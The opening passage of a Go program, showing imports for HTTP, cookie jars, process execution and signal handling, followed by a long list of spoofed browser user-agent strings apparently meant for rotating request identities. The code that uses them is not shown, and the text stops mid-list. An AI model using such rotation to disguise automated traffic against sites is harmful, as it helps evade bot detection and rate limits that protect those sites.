package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"net/http/cookiejar"
	"math/rand" 
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.2420.81",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Vivaldi/6.6.2867.62",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 YaBrowser/24.4.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/110.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:109.0) Gecko/20100101 Firefox/110.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 OPR/96.0.4693.31",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Vivaldi/5.6.2800.50",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.1.3.945 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:110.0) Gecko/20100101 Firefox/110.0",
	"Mozilla/5.0 (Windows NT 10.0; rv:110.0) Gecko/20100101 Firefox/110.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.66",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Vivaldi/6.5.3206.55",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 YaBrowser/24.3.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:108.0) Gecko/20100101 Firefox/108.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:108.0) Gecko/20100101 Firefox/108.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.4635.8",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.5.2805.50",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 YaBrowser/23.1.2.945 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0",
	"Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.83",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Vivaldi/6.4.3160.40",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 YaBrowser/24.1.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:107.0) Gecko/20100101 Firefox/107.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:107.0) Gecko/20100101 Firefox/107.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.4606.65",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Vivaldi/5.4.2753.47",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/22.11.5.724 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.133",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.3.3105.58",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/23.11.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:106.0) Gecko/20100101 Firefox/106.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:106.0) Gecko/20100101 Firefox/106.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.4585.84",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 YaBrowser/22.9.4.863 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.2151.58",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.2.3035.84",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 YaBrowser/23.9.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:105.0) Gecko/20100101 Firefox/105.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:105.0) Gecko/20100101 Firefox/105.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.4515.131",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Vivaldi/5.2.2623.46",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.7.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Vivaldi/6.1.3035.300",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 YaBrowser/23.8.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:104.0) Gecko/20100101 Firefox/104.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:104.0) Gecko/20100101 Firefox/104.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Vivaldi/5.1.2547.68",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 YaBrowser/22.5.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Vivaldi/6.0.2979.54",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 YaBrowser/23.7.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:103.0) Gecko/20100101 Firefox/103.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:103.0) Gecko/20100101 Firefox/103.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
